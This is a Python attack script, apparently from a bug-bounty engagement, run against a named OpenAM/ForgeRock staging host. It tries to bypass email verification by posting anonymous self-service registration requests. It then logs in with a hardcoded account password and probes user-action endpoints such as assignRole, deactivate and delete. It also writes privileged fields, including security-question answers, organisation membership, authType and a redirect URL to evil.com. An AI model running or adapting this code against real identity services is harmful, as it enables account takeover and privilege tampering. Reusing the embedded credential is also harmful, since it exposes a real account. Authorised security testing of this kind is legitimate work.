# -*- coding: utf-8 -*-
"""AIC 第四十二轮:submitRequirements 匿名深挖 + A/C 段重跑(带重试)
承诺(设计):注册/找回用户名必须走认证树(邮件验证)。反例:匿名 selfservice
   REST 端点直接提交(submitRequirements),绕过认证树流程。
上轮信号:匿名 submitRequirements -> 500(存在但 body 不对)。
本轮:body 格式迭代,找 200;若注册成功则验证账户是否存在(绕过邮件验证?)。
预期结果表:
  成立(漏洞) -> submitRequirements 200 且新用户可登录(绕过邮件验证)或返回注册成功
  不成立 -> 持续 401/500,或 200 但注册仍需邮件验证(返回挂起)
"""
import requests, urllib3, json, time
urllib3.disable_warnings()

BASE = 'https://openam-bug-bounty-stag.forgeblocks.com'
AUTH = BASE + '/am/json/realms/alpha/authenticate'
USER, PASS = 'pccp', 'Agent360User$5h2!QxR'
MY_ID = 'db3d6356-61a0-4684-9eaa-c1353dfa44d9'
COOKIE_NAME = 'aa942d46ece12ce'

S0 = requests.Session()
S0.trust_env = False
S0.proxies = {'http': None, 'https': None}
S0.headers.update({'User-Agent': 'Mozilla/5.0', 'Accept-API-Version': 'resource=1.0, protocol=1.0',
                   'Content-Type': 'application/json'})

print('=== 1. submitRequirements body 格式迭代 ===')
bodies = [
    {},
    {'requirement': 'userRegistration'},
    {'requirement': 'userRegistration', 'content': {'userName': 'sr1643a', 'givenName': 'Sr',
                                                     'sn': 'Test', 'mail': 'sr1643a@example.com',
                                                     'password': 'SrTest1643!x'}},
    {'requirement': {'type': 'userRegistration', 'content': {'userName': 'sr1643a', 'givenName': 'Sr',
                                                              'sn': 'Test', 'mail': 'sr1643a@example.com',
                                                              'password': 'SrTest1643!x'}}},
    {'requirements': [{'type': 'userRegistration', 'content': {'userName': 'sr1643a', 'givenName': 'Sr',
                                                                'sn': 'Test', 'mail': 'sr1643a@example.com',
                                                                'password': 'SrTest1643!x'}}]},
    {'requirement': 'userRegistration', 'content': {'userName': 'sr1643a', 'givenName': 'Sr',
                                                     'sn': 'Test', 'mail': 'sr1643a@example.com',
                                                     'userpassword': 'SrTest1643!x'}},
]
for i, b in enumerate(bodies):
    try:
        r = S0.post(BASE + '/am/json/realms/alpha/selfservice/userRegistration?_action=submitRequirements',
                    json=b, timeout=15, verify=False)
        print('[%d] %-100s -> %d %s' % (i, json.dumps(b, ensure_ascii=False)[:100],
              r.status_code, r.text[:180].replace('\n', ' ')))
    except Exception as e:
        print('[%d] ERR %s' % (i, str(e)[:80]))
    time.sleep(0.8)

print('\n=== 2. forgottenUsername 同样迭代 ===')
for b in [{'requirement': 'forgottenUsername'},
          {'requirement': 'forgottenUsername', 'content': {'mail': 'sr1643a@example.com'}}]:
    try:
        r = S0.post(BASE + '/am/json/realms/alpha/selfservice/forgottenUsername?_action=submitRequirements',
                    json=b, timeout=15, verify=False)
        print('forgottenUsername %-60s -> %d %s' % (json.dumps(b)[:60], r.status_code, r.text[:180].replace('\n', ' ')))
    except Exception as e:
        print('ERR', str(e)[:80])
    time.sleep(0.8)

print('\n=== 3. 若注册成功,尝试登录 sr1643a ===')
r = S0.post(AUTH, json={}, timeout=15, verify=False)
d = r.json()
authId = d['authId']
cbs = []
for cb in d.get('callbacks', []):
    t = cb['type']
    inp = [{'name': 'IDToken1', 'value': 'sr1643a'}] if t == 'NameCallback' else \
          [{'name': 'IDToken2', 'value': 'SrTest1643!x'}] if t == 'PasswordCallback' else \
          [{'name': k.get('name'), 'value': k.get('value')} for k in cb.get('input', [])]
    cbs.append({'type': t, 'output': cb.get('output', []), 'input': inp, '_id': cb.get('_id')})
r2 = S0.post(AUTH, json={'authId': authId, 'callbacks': cbs}, timeout=15, verify=False)
try:
    j = r2.json()
    print('登录 sr1643a -> %d tokenId=%s' % (r2.status_code, (j.get('tokenId') or 'NONE')[:30]))
except Exception:
    print('登录 sr1643a -> %d %s' % (r2.status_code, r2.text[:150]))

print('\n=== 4. A 段重跑(users _action,带重试) ===')
S = requests.Session()
S.trust_env = False
S.proxies = {'http': None, 'https': None}
S.headers.update({'User-Agent': 'Mozilla/5.0'})
r = S.post(AUTH, json={}, timeout=15, verify=False)
d = r.json()
authId = d['authId']
cbs = []
for cb in d.get('callbacks', []):
    t = cb['type']
    inp = [{'name': 'IDToken1', 'value': USER}] if t == 'NameCallback' else \
          [{'name': 'IDToken2', 'value': PASS}] if t == 'PasswordCallback' else \
          [{'name': k.get('name'), 'value': k.get('value')} for k in cb.get('input', [])]
    cbs.append({'type': t, 'output': cb.get('output', []), 'input': inp, '_id': cb.get('_id')})
r2 = S.post(AUTH, json={'authId': authId, 'callbacks': cbs}, timeout=15, verify=False)
tok = r2.json().get('tokenId')
S.headers.update({'Cookie': COOKIE_NAME + '=' + tok, 'Accept-API-Version': 'resource=2.1, protocol=1.0'})
print('LOGIN OK')

U = BASE + '/am/json/realms/root/realms/alpha/users/' + MY_ID
for act in ['link', 'unlink', 'assignRole', 'removeRole', 'verifyMail', 'resendMail',
            'activate', 'deactivate', 'refresh', 'revokeTokens', 'validatePassword',
            'passwordReset', 'register', 'update', 'replace', 'get', 'read',
            'search', 'create', 'delete', 'forgotPassword', 'changePassword', 'logout']:
    for attempt in range(3):
        try:
            r = S.post(U + '?_action=' + act, json={}, timeout=15, verify=False)
            print('%-16s -> %d %s' % (act, r.status_code, r.text[:90].replace('\n', ' ')))
            if r.status_code not in (400, 403, 404, 405, 501):
                print('  !! 信号: %s -> %d' % (act, r.status_code))
            break
        except Exception as e:
            if attempt == 2:
                print('%-16s -> ERR %s' % (act, str(e)[:60]))
            else:
                time.sleep(2)
    time.sleep(0.5)

print('\n=== 5. C 段重跑(PUT 字段,带重试) ===')
fields = [
    ('kbaInfo', [{'questionId': '1', 'answer': 'hacked_answer'}]),
    ('memberOfOrgIDs', ['1']),
    ('telephoneNumber', ['12345678']),
    ('description', ['hacked']),
    ('authType', ['LDAP']),
    ('iplanet-am-user-success-url', ['https://evil.com/after']),
    ('preferences/marketing', True),
    ('manager', {'_ref': 'managed/user/00000000-0000-0000-0000-000000000000'}),
]
for f, v in fields:
    for attempt in range(3):
        try:
            r = S.put(U, json={f: v}, timeout=15, verify=False)
            print('%-28s -> %d %s' % (f, r.status_code, r.text[:90].replace('\n', ' ')))
            if r.status_code == 200:
                r2 = S.get(U, timeout=15, verify=False)
                print('    -> 200! 回显含字段:', f in r2.text)
                S.put(U, json={f: ''}, timeout=15, verify=False)
            break
        except Exception as e:
            if attempt == 2:
                print('%-28s -> ERR %s' % (f, str(e)[:60]))
            else:
                time.sleep(2)
    time.sleep(0.5)
